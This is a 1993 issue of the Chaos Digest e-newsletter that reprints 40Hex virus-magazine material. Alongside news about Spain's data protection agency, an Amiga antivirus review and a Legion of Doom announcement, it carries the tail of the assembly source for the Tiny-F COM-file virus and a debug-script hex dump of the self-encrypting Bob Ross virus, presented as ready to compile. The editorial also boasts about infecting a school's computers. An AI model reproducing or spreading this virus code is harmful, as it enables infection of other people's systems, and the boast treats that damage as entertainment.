        MOV     DX,OFFSET 00001         ;where to set pointer
        INT     DOS                     ;do it!
        MOV     AH,40H                  ;write to file
        LEA     DX,[SI+offset endprog+3];write data at SI+BUFFER
        MOV     CX,0002H                ;two bytes (the JMP)
        INT     DOS                     ;do it!
        MOV     AX,5701h                ;store date
        POP     CX                      ;restore time
        POP     DX                      ;restore date
        INT     DOS                     ;do it!
exit:
        MOV     AH,3EH                  ;close file
        INT     DOS                     ;do it!

;Return DTA to old position - Dark Angel

        MOV     AH, 1Ah                 ;Set DTA
        MOV     DX, 80h                 ; to PSP DTA
        INT     21h

        JMP     BP

;------------------------------------------------------------------------
;encrypted data goes here
;------------------------------------------------------------------------

fspec   LABEL   WORD
        DB      '*.COM',0
nondata DB      'Tiny-F version 1.1'    ;Program identification
        DB      '%$!"&%',=)%&-!'        ;author identification
        DB      'Released 10-19-91'     ;release date
endenc  LABEL   BYTE                    ;end of encryption zone
;------------------------------------------------------------------------
;nonencrypted data goes anywhere after here
;------------------------------------------------------------------------

blnkdat LABEL   WORD
        DW      0000H

;Only en_val is needed now because of new encryption mechanism
en_val  DW      0h

endprog LABEL   WORD
tinyv   ENDS
        END     start

+++++

40Hex Issue 3                                                       0010

                              In Closing

     Well that will do it for this issue.  Sorry it took so damn long,
     but screw it.

     Next issue we will have more articals, more viruses, and all that.

     We were supposed to have an interview with an Amiga virus writer
     this issue but we just couldn't get it in time.  Also we were
     planning an interview with John Mcafee, but the same story there.

     Also next issue, I hope to have the Bob Ross virus, from the
     twisted mind of Dark Angel.  And If I can find it, the DIR-2 virus
     and The Teqeulla Virus, so I can't spell.

     See you then.

------------------------------

Date: Sun, 16 May 93 21:01:10 -0100
From: rfcalvo@guest2.atimdr.es (Rafael Fernandez Calvo )
Subject: File 2--Agence de Protection des Donnees Espagnoles (creation)


    CCCCC  LL     II
   CC      LL     II
   CC      LL     II    --  N E W S   FROM   S P A I N  --- May 16, 1993
    CCCCC  LLLLLL II

 COMMISSION for LIBERTIES
 and INFORMATICS (*)


       DATA PROTECTION AGENCY CREATED BY THE SPANISH COVERNMENT
       ++++++++++++++++++++++++++++++++++++++++++++++++++++++++

     The Government of the Kingdom of Spain approved on May 4th, 1993 the
Estatute of the Data Protection Agency (Agencia de Proteccion de Datos), the
body that, according to the Law on Protection of Personal Data (whose acronym
is LORTAD) approved by the Spanish Parliament in October 1992, will watch
over proper observance of this law.

     According to its Estatute, the Agency is an independent body, headed
by its Director, who will be nominated by the Government among the members
of the Consultive Council. The Council will have nine members, elected for
a period of four years by the Congress, the Senate, the Ministry of Justice,
the Regional Governments, the Federation of Provinces and Cities, the Royal
Academy of History, the Council of Universities, the Council of Consumers and
Users, and the Council of Chambers of Commerce, respectively. Trade Unions
and DP Professionals will not be represented in spite of the proposals of
CLI, that also submitted one of having the Director nominated by the Council
itself instead of by the Government in order to insure the independence of
the Agency

     Among the powers of the Agency are those of dictating fines of up to
1 Million US $ and sealing personal data files of companies and entities that
infringe the law. The Agency will the body representing Spain in the European
Community, the Council of Europe and the Schengen Agreement on free
circulation of people within the EC borders for all the matters regarding
personal data protection.

     The Data Protection Agency will have to be created in the middle of a
sharp campaign for Congress and Parliament in elections that will be held on
June 6, whose outcome, according to the polls, will be very tight between the
ruling Socialist Party and the center-right People's Party, with a well
placed third party: United Left (a communist-led coalition). These two
parties gave strong support to the position of CLI with regard to the LORTAD
during its discussion in Congress and Senate.

      CLI achieved in February its goal of seeing the appeal against the
Personal Data Law put before the Constitutional Court of Spain by the
Ombudsman, the Peoples' Party and the Regional Parliament of Catalonia. The
appeals address basically the concerns of CLI that the law establishes a lot
of unjustified exceptions in favour of Government with regard to the rights
that citizens have about their personal data. Even though the appeals don't
interrupt the application of the law since Jan. 31, they leave the door open
to its modification in the sense promoted by CLI.

     Let's recall that Spain is one of the very few countries whose Carta
Magna foresees the dangers that can stem from misuse of Information
Technology. In fact, its Constitution establishes that a "law will limit the
use of Information Technologies in order to protect citizens' honour and
their personal and family privacy as well as the unrestricted exercise of
their rights" (article 18.4).

      The position of CLI about the LORTAD can be summarized as follows:

- The law does not fulfill the expectations arisen, although it is a step
forward in comparison with the current situation of "allegality" that has
been a constant source of severe abuse against privacy;

- The good side of the law is the regulation of personal data files
in the hands of companies and private entities. Citizens will have
wide rights to access, modification and cancellation of this kind of
records.

- The bad side stems from the following facts:

   a) The bill gives excessive and uncontrolled power to Policy Forces
   over collection and computerization of highly sensitive data: ideology,
   religion, beliefs, racial origin, health and sexual orientation.

   b) Computerized personal data records in the hands of all branches
   of Public Administrations will be in many cases excluded from the rights
   (access, modification, cancellation) given to citizens with regard to
   the same kind of data in the hands of private companies.

   c) The Data Protection Agency that will watch over proper observance of
   the law will have scarce autonomy from the Government, that will
   nominate and dismiss its Director.


* SOME WORDS ABOUT CLI

     The --Commission for Liberties and Informatics, CLI-- is an independent
and pluralistic organization that was officially constituted in April '91.

      Its mission is to "promote the development and protection of citizens'
rights, specially privacy, against misuse of Information Technologies".

     As of May '93, CLI is composed by nine organizations, with a joint
membership of about 3,000,000 people. They cover a very wide spectrum of
social interest groups: associations of computer professionals, judges, civil
rights leagues, trade unions, consumers groups, direct marketing industry,
etc.

     CLI is confederated with similar bodies created in some other Spanish
Regions such as Valencia, Basque Country and Catalonia, and has fluid
working relationships with many public and private Data Protection bodies
and entities all over the world, including CNIL, CPSR and Privacy
International.

     CLI has its headquarters in:

Padilla 66, 3 dcha.
E-28006 Madrid, Spain

Phone: (34-1) 402 9391
Fax: (34-1) 309 3685
E-mail: rfcalvo@guest2.atimdr.es

------------------------------

Date: Sun May 23 00:06:00 -0600 1993
From: roberts@decus.arc.ab.ca ("Rob Slade, DECrypt Editor, VARUG NLC rep )
Subject: File 3--"BootX" pour Amiga (critique)
Copyright: Robert M. Slade, 1993


                               Comparison Review

Company and product:

Peter Stuer
Kauwlei 21
B-2550 Kontich
Belgium
Peter.Stuer@p7.f603.n292.z2.FidoNet.Org
BootX 5.23

Summary: Scanner and disinfector with some operation restriction

Cost: unknown

Rating (1-4, 1 = poor, 4 = very good)
      "Friendliness"
            Installation
            Ease of use
            Help systems
      Compatibility
      Company
            Stability
            Support
      Documentation
      Hardware required
      Performance
      Availability
      Local Support

General Description:

                  Comparison of features and specifications

User Friendliness

Installation

Both automated and manual installation is provided.

Ease of use

BootX can be run from either the CLI or the Workbench.  Once invoked it can
be made the "foreground task" by a "hot key" call.  The program is menu
driven, with a comprehensive range of actions.

Help systems

Can use the AmigaGuide.library function if available.

Compatibility

Unknown but unlikely to cause problems.  Some problems are noted with
Enforcer.  Will work with certain compression programs to check compressed
executables.

Company Stability

Unknown, but this is currently one of the major recommended Amiga antivirals.
The program is distributed as freeware.

Company Support

The author's mail and email addresses are given, as well as contact info for
"Safe Hex International".

Documentation

Simple but straightforward directions on the installation and running of the
program.  There is little general discussion of viral programs and operation,
but some is mentioned in conjunction with certain features of the program.
Unusually for a shareware/freeware package there is an extensive glossary
which may provide some background.  (I learned, for instance, that a
"linkvirus" is the term for what is more generally known as a program or file
infecting virus).

System Requirements

512K RAM or higher and at least one disk drive.  KickStart v2.04 and
ReqTools.library v38 or higher.  Workbench v2.1 or higher to use the language
independence utility and v3.0 or higher to use the AmigaGuide.library help
feature.  Various decompression programs may be needed to check compressed
executables.

Performance

Unknown at this time due to lack of a test suite.  Currently one of the most
highly recommended Amiga antivirals.

Local Support

The author is reachable via Fidonet and Internet mail.

Support Requirements

Users experienced with using shareware should have no problems.

==============
Vancouver      ROBERTS@decus.ca         | Slade's Law of Computer
Institute for  Robert_Slade@sfu.ca      |        Literacy:
Research into  rslade@cue.bc.ca         |   - There is no such thing
User           p1@CyberStore.ca         |     as "computer illiteracy";
Security       Canada V7K 2G6           |     only illiteracy itself.


[ChaosD: Voici les commentaires de l'auteur de ce programme sur ce papier:]

Date: Wed May 26 17:58:49 PDT 1993
From: Peter.Stuer@p7.f603.n292.z2.fidonet.org (Peter Stuer )

Hum...seems you're a bit behind on the news. I stopped developing BootX last
March because of lack of time.

  /~\
 C oo
 _( ^)
/   ~\  Peter Stuer.

--
uucp: uunet!m2xenix!puddle!2!292!603.7!Peter.Stuer
Internet: Peter.Stuer@p7.f603.n292.z2.fidonet.org

------------------------------

Date: Tue, 25 May 1993 10:32:28 -0400
From: tdc@zooid.guild.org (TDC )
Subject: File 4--Nouveau rebondissement de _The Legion of Doom_ (news)


                        Final Anouncement

                               The
                               LOD
                          Legion of Doom
                             Is Back!

No that has not been a mis-print... the LOD has returned!  The world's
greatest hacking group has formally been reinstated to bring back dignity
and respect to a scene that has rapidly deteriorated since its departure.

The LOD is not just another "Group" that goes around with upper/lower case
names, trading in PBX's and VMB's and wouldn't know COSMOS if it hit them
over the head.  It's a sad day indeed when the term hacker is used to refer
to every code and credit card abusing rodent in the nation.  We intend
through our presence and many innovative projects, not to mention the
technical journal to restore the original values of technical exploration
and knowledge that the term hacker was founded on.

The LOD imbodies the pinnacle of understanding that comes from relentless
exploration of the "system" backwards and forwards.  It is an organization
dedicated to understanding the world's computer and telephone networks.
Enabling everyone to progress forward in technology.  The accumulated product
of this--the Technical Journals, full of information unavailible anywhere
except from telco manuals represents something to valuable to lose.

[...] This will be the primary of purpose the new, revived LOD - the assembly
and release of a Technical Journal.  The previous four issues, now several
years old BADLY need updating.

The Journal will rely heavily on reader submitted articles and information,
so anything you wish to contribute would be GREATLY appreciated.  Acceptable
submitions would include ORIGINAL "how-to- guides" on various systems,
security discussions, technical specifications and doccumentation.  Computer
and telephone related subjects are not the only ones acceptable.  If you
remember the former journals had articles concerning interrogation, physical
security among others.

The next LOD Technical Journal will comprise almost entirely of freelance or
reader submitted articles. So without YOUR contributions it can not proceed!
Solid progress is being made in the next Technical Journal by both free-
lancers and group members.  But bigger is better, as you can never have too
much information or instruction.

SEND UP ALL ORIGINAL ARTICLES FOR PUBLICATION!!!

If you wish to hold the wonderful honour of being an LOD Member  (Won't
this look good on the resume), you may apply by contacting us.  The
qualifications should need no elaboration.

Regardless of the unbased claims made by others, the LOD is as strong and
capable as it ever was.  Legendary groups like the LOD are not born this way.
They take time to form, and restarting almost from scratch almost three years
later, time is obviously needed.  We say to all the skeptics, hang on to your
premature judgements until we're on our feet and judge by actions not
opinions.

To set the record straight once and for all, and to convince the skeptics
that doubt the validity of all this, the Legion of Doom >IS< BACK.  Next
month, a full-fledged Technical Journal will be widely released, and you're
doubts and questions will be once and for all answered with uncontestable
fact.

In addition to needing articles for the upcoming Journals, some sites on the
net to aid in distribution would also be welcomed.  Someone willing to donate
the resources necessary to operate a subscription type mailing list service
is also needed.  Send all offers and articles to our email account or PO Box.

Reach us at:            tdc@zooid.guild.org

Or by blindingly quick, faster than light mail at:

                                LOD
                            P.O. Box 104
                         4700 Keele Street
                       North York, ON  M3J-1P3

Closing date for article submittions to the LOD Technical Journal
Number 5 is: Monday 14 June, 1993.

Release date: Friday 18 June, 1993.

Since we have no monetary or contractual obligation to anyone, these dates
are of course tentative. But since or at least initially we will rely almost
entirely on reader submitions a date is needed to get potential writers into
gear.

Note that the LOD does not engage or condone illegal or criminal activities.
This would cover, but is not limited to, theft of long distance services,
credit fraud or data destruction/alteration.

Lord Havoc

------------------------------

End of Chaos Digest #1.40
************************************

Chaos Digest               Lundi 31 Mai 1993        Volume 1 : Numero 41
                            ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.41 (31 Mai 1993)
File 1--40H VMag Issue 1 Volume 4 #000-003 (reprint)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * cs.ubc.ca [137.82.8.5] in /mirror3/EFF/cud/chaos
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Issue 1 Volume 4 #000-003 (reprint)


40Hex Issue 4                                            December 1991


                                 Index
                                 -----


001.....................................................USA Virus News
002.................................................The Bob Ross virus
003...................................................The Sunday Virus
004...................................................The Terror Virus
005...............................................Virus Survay Artical
006.................................................The Typo COM virus
007.....................................................From Johns BBS
008.................................................The Marauder Virus
009................................................Pklite Scan Strings
010...............................................Encryption Defeating
011...............................................The Ultimate Toolkit
012..............................................Tequilla Virus Source
013...................................................................
014...................................................Is This The End?


Thanks to:
           Shade of Sorrow, Demogorgon, Dark Angel, Count Zero,
           Piff', Paragon Dude (and the rest of Phalcon), Blade Runner,
           The Fisch, Instigator, Decimator, Dr. Logic, Venom/Hate (and
           all the QSD/Lutz crowd), God, Amiga Factor, all the people
           from the city, and all I forgot...

+++++

40Hex Issue 4                                            December 1991

                               Whats New
                               ---------

     Well a lot of things been going on this month.  Well I've been
     really lazy lately and haven't gotten around to writing this issue
     for over two months I guess.  Well let me tell you whats been going
     on.

     Let me take the time now to address these lame fucking people who,
     if they had 9600+ modems, would be wares puppies, but being they
     have a 2400 they decide to practice there leeching habits on
     viruses.  They are the virus collectors, they ones who never run
     the damn things, just add them to there collection and upload them
     here and there to be really, as they say, "K-K00\_."  Please
     mother fuckers, stop.  I mean look at the Red Cross virus, does
     anyone have the real copy of it?  Some lame ass collector found
     something that scanned as Red-X and was "/> a |)" enough to upload
     it everywhere.  Please, give it up.  Virus BBS's are a great thing,
     and without them we would be lost, but by the same tolken these
     collectors, or as someone once said, "Micro-Wares Puppies," must
     get with the program or die.

     Well second of all, I've been calling The Homebase quite a bit
     lately and came to one conclusion, people are dumb.  Look in this
     issue for some scroll backs of stupid things people have posted on
     that BBS this month or so.

     The Bob Ross virus has been released in the mist, so watch what you
     D/L.  Hmmmm, I think SCAN 85 caught it, but that will change soon,
     right DA?

     Funny story.  I infected my schools computer with several viruses
     before I transferred out.  Well what I heard happened from that is
     this.  They somehow could not get the viruses to dissapper no
     matter what they did.  Incedently it was Whale and some other
     viruses. Anyway, out of the fustration of the viruses reappering
     all the time, they decided to out and get rid of all the hard
     drives.  So they removed all the hard drives from all the systems
     and put them in storage.  Anyway, they finally got a virus expert
     to come it, he said that they didn't have to get rid of the hard
     drives he can rid the viruses.  Well to late.  The art department
     had got a hold of them and wealded them together into one big
     statue!  Thousands of dollars worth of hardware down they drain.
     The school was so embarressed at the whole thing they shipped the
     statue way out of state where so everybody would soon forget this
     screwup.  Thanks to Shade of Sorrow for finding that one out for
     me.

     SCAN 85 _is_ out, 'nuff said.

     Bet you all heard the story about Novell and Stoned III?  If not
     this is the run down.  Novell got infected by Stoned III.  Novell
     distributed infected copies of the December update to everyone.
     That's the story.

+++++

40Hex Issue 4                                            December 1991

                           The Bob Ross Virus

This is the infamous Bob Ross virus by Dark Angel of Phalcon/Skism.

Here's a bit from the author first.

 The Funky Bob Ross Virus Version 1.0
 Written by Dark Angel / 26 September 1991 / (c) 1991
 PHALCON/SKISM Co-op
 Effective length: 1125, Resident length: 672 bytes

 DEDICATION:
   This virus was written expressedly to
      1) Piss off Patty Hoffman, John McAffee, Ross Greenberg, and all the
         other guru-wanna-bes in this world.
      2) Spread the message of The Almighty Bob, and so enrichen the lives
         of people all over the world.
      3) Show off (Now I can tell people that I wrote a virus!)

 WHAT THIS IS:
   This is a self-encrypting, non-overwriting COM infector.  It doesn't do
   anything to EXE files.  File sizes increase by 1117 bytes.  It goes off
   on July 9th of any year or after 7 infection "waves."

 WHAT IT DOES WHEN IT GOES OFF:
   The virus goes memory resident and prints out a Bobism every 5 minutes.
   It then enters a delay loop for approximately 5 seconds, allowing for a
   brief moment of silence while the victim reads Bob's holy message.  The
   virus will not destroy anything.  The virus will not go TSR if it finds
   another copy of itself in memory.


 Well, here it is, the hex dump, by now you should know how to compile
 it from the hex dump.

---------------------------------------------------------------------------
n bob-ross.com
e 0100  FF 26 04 01 D0 08 C8 07 00 00 00 00 00 00 00 00
e 0110  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0120  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0130  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0140  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0150  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0160  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0170  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0180  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0190  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 01A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 01B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 01C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 01D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 01E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 01F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0200  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0210  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0220  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0230  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0240  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0250  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0260  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0270  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0280  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0290  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 02A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 02B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 02C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 02D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 02E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 02F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0300  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0310  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0320  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0330  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0340  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0350  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0360  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0370  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0380  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0390  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 03A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 03B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 03C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 03D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 03E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 03F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0400  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0410  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0420  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0430  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0440  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0450  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0460  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0470  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0480  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0490  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 04A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 04B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 04C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 04D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 04E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 04F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0500  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0510  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0520  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0530  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0540  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0550  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0560  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0570  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0580  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0590  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 05A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 05B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 05C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 05D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 05E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 05F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0600  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0610  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0620  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0630  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0640  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0650  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0660  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0670  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0680  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0690  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 06A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 06B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 06C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 06D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 06E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 06F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0700  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0710  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0720  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0730  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0740  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0750  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0760  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0770  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0780  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0790  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 07A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 07B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 07C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 07D0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 07E0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 07F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0800  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0810  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0820  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0830  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0840  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0850  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0860  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0870  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0880  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 0890  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 08A0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 08B0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
e 08C0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 CD 20
e 08D0  FC E8 0A 00 BE D3 01 03 36 06 01 FF E6 B6 BE 15
e 08E0  01 03 36 06 01 8A 24 B9 23 04 83 C6 2D 90 8B FE
e 08F0  AC 32 C4 AA E2 FA C3 56 E8 E3 FF B9 5D 04 5A 83
e 0900  C2 B5 90 B4 40 CD 21 E8 D4 FF 75 5F 7D B1 B6 B6
e 0910  B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6
e 0920  B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6
e 0930  B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6
e 0940  B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6
e 0950  B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 EA
e 0960  B6 9C 98 D5 D9 DB B6 9C 98 9C B6 98 98 B6 B6 B6
e 0970  B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6
e 0980  B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6
e 0990  B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 B6 37 70 C6 49 3D
e 09A0  48 35 71 BE 0F BE B6 45 12 02 F1 84 64 35 70 BC
e 09B0  7B 97 C4 9C 02 8D 3D 60 35 74 F4 7B 97 C4 A9 35
e 09C0  70 F6 48 B2 E0 35 70 B7 70 B2 B5 5E A9 B6 E8 36
e 09D0  8A B1 CB BB 02 9C 7B 97 37 4C BF B1 C2 B5 5F A0
e 09E0  B4 5F 11 B7 B6 B6 B6 B6 B6 B6 B6 B6 B6 E3 3D 5A
e 09F0  35 5A 9A E0 5D C6 26 02 AC 3B E0 62 7B 97 02 F8
e 0A00  0F A6 B6 0C 29 B7 B5 A0 B0 B7 7B 97 5D 90 36 C8
e 0A10  44 98 C2 A3 3B E0 44 02 8D 7B 97 C4 BA 08 10 B7
e 0A20  B5 80 B0 B7 49 B2 5E 72 49 3B E0 62 02 AC 7B 97
e 0A30  02 F9 7B 97 C5 6E 08 10 B7 B5 80 B0 B7 35 8A B6
e 0A40  C8 BB 49 BA 0C 15 B7 B5 A0 B0 B7 02 8D 7B 97 E8
e 0A50  3D 53 EB 75 5F 16 B7 08 10 B7 B5 80 B0 B7 71 B2
e 0A60  B6 B6 5D 5D 5D 27 02 AC 0C 1E B7 B5 A0 B0 B7 7B
e 0A70  97 02 F8 0F B1 B6 0C 2F B7 B5 A0 B0 B7 7B 97 C4
e 0A80  55 5D A4 26 08 20 B7 B5 80 B0 B7 48 BA C2 7E 02
e 0A90  F9 7B 97 C4 79 08 7A B7 B5 80 B0 B7 36 8A F2 C2
e 0AA0  58 0E B6 8B 3D 60 35 5C B0 7B 97 C4 54 25 02 89
e 0AB0  0F BE B6 0C F5 B7 B5 A0 B0 B7 E4 7B 97 E8 E0 1B
e 0AC0  8B 49 90 C3 A2 1B 8B B2 B7 C3 B8 E8 02 88 7B 97
